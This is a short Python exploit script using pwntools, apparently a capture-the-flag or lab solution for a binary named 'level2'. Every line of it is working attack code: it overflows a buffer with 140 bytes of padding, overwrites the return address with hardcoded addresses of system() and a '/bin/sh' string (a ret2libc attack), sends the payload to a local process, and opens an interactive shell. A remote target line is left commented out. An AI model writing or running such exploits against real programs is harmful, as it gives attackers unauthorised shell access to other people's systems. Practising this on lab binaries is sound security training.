#!/usr/bin/env python
from pwn import *

p = process('./level2')
#p = remote('127.0.0.1',10001)
ret = 0xdeadbeef
systemaddr = 0xf7e3f940
binshaddr = 0xf7f5e02b


payload =   'A' * 140 +p32(systemaddr) + p32(ret) +p32(binshaddr)

p.send(payload)

p.interactive()
